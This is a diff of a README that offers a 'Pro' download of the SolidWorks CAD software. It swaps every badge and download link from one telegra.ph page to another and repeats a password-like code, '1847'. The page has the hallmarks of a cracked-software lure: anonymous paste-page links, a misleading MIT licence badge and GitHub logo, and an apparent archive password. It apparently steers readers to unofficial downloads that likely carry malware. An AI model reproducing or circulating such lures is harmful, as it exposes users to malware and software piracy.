@@ -1,14 +1,14 @@
 # SolidWorks -- Pro Version Download & Setup Guide 2026
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
-[![Category](https://img.shields.io/badge/Category-CAD%20%26%20Engineering-purple)](https://telegra.ph/Download-05-21-39)
-[![Version](https://img.shields.io/badge/Version-Pro-gold)](https://telegra.ph/Download-05-21-39)
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Latest-06-01-4)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Latest-06-01-4)
+[![Category](https://img.shields.io/badge/Category-CAD%20%26%20Engineering-purple)](https://telegra.ph/Latest-06-01-4)
+[![Version](https://img.shields.io/badge/Version-Pro-gold)](https://telegra.ph/Latest-06-01-4)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Latest-06-01-4)
 
 ---
 
-[![SolidWorks](og-image.png)](https://telegra.ph/Download-05-21-39)
+[![SolidWorks](og-image.png)](https://telegra.ph/Latest-06-01-4)
 **🔐🔐🔐** `1847`
 
 **🔐🔐🔐** `1847`
@@ -25,7 +25,7 @@
 
 ## Download & Get Pro
 
-[![Get SolidWorks Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
+[![Get SolidWorks Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://telegra.ph/Latest-06-01-4)
 **🔐🔐🔐** `1847`
 
 **🔐🔐🔐** `1847`
